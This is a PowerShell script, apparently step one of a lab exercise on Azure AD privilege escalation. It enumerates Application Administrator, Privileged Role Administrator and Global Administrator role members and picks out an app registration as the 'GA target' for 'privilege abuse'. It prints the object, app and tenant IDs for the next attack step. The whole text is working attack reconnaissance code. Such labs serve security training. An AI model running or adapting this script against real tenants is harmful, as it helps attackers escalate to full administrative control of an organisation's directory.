
# Step 1.1:  Connect with any Azure AD User and manually grab the Application Administrator
$username = ""
$password = ""
$securepassword = ConvertTo-SecureString "$password" -AsPlainText -Force
$credential = New-Object System.Management.Automation.PSCredential($username, $securepassword)

Connect-AzureAD -Credential $credential

# Display the "Application Administrator" role to get its ObjectId 
Get-AzureADDirectoryRole | ?{$_.DisplayName -eq 'Application Administrator'} | select DisplayName, ObjectId, RoleTemplateId

# Capture ObjectId into variable
$appadminObjectId = (Get-AzureADDirectoryRole  | ?{$_.DisplayName -eq 'Application Administrator'} | select ObjectId).ObjectId 

# Display the Azure AD Users assigned into this role
Get-AzureADDirectoryRoleMember -ObjectId $appadminObjectId 

# Get the first user and capture it into a variable
$results = (get-AzureADDirectoryRoleMember -ObjectId $appadminObjectId).UserPrincipalName 

$upn = ""
if ( $results.count -gt 1 ) {
 $upn = $results | Select-Object -first 1
} else {
 $upn = $results
}

Write-Host("upn to target Application Administrator: $upn") 

# Step 1.2: Ensure that there is a Service Principal for abuse with Privileged role administrator 
Get-AzureADDirectoryRole  | ?{$_.DisplayName -eq 'Privileged role administrator'}

# Capture ObjectId for PRA into variable
$praObjectId = (Get-AzureADDirectoryRole  | ?{$_.DisplayName -eq 'Privileged role administrator'} | select ObjectId).ObjectId 

# Display the Azure AD Applications assigned into this role
$praResults = Get-AzureADDirectoryRoleMember -ObjectId $praObjectId

if ( $praResults.count -ge 1 ) {
  Write-Host("An application has been assigned into PRA role - privilege escalation might be possible")
  $praResults
} else {
  Write-Host("No PRA assignment found")
}

# Step 1.3: Find GA Target:  Ensure that there is an Application with Global Administrator SP that we can target for privilege abuse 
# Get the ObjectId for Global Administrator
$gaObjectId = (Get-AzureADDirectoryRole  | ?{$_.DisplayName -eq 'Global Administrator'} | select ObjectId).ObjectId

# Display the Azure AD Applications assigned into this role of Global Administrator
$gaResults = Get-AzureADDirectoryRoleMember -ObjectId $gaObjectId | select DisplayName,ObjectId,AppId

if ( $gaResults.count -ge 1 ) {
  Write-Host("An application has been assigned into GA role ~ here they are:")
  $gaResults
} else {
  Write-Host("No GA assignment found for an application")
}

# get the tenant details
$tenantdetails = $username.Split("@")
$search_app = $tenantdetails[1]
# use this string below to look for the GA application associated with UPN
$search_app

# Get the most recently created GA application created for this lab, based on UPN search
$gaTarget = $gaResults | ?{$_.DisplayName.Contains($search_app)}

if ( $gaTarget.count -ge 1 ) {
  Write-Host("This is the SP GA Target!")
  $gaTarget
}

# Get the AppId of this SP target
$appId = $gaTarget.AppId

# Lookup the app registration for this target 
$targetappRegistration = Get-AzureADApplication | ?{$_.AppId -eq $appId} | Select DisplayName,ObjectId,AppId

# Display if at least one
if ( $targetappRegistration.count -ge 1 ) {
  Write-Host("This is the App Registration GA Target!")
  $targetappRegistration
  $objectid = $targetappRegistration.ObjectId
  $appid = $targetappRegistration.AppId
  Write-Host("This is the ObjectId to target in the next step:  $objectid")
  Write-Host("This is the AppId to target in the next step:  $appid")
  $tenantDetails = Get-AzureADTenantDetail
  $tenantid = $tenantDetails.ObjectId
  Write-Host("This is the TenantId to target in the next step:  $tenantid")
}

# Step 1.4:  Disconnect as this regular Azure AD user
Disconnect-AzureAD
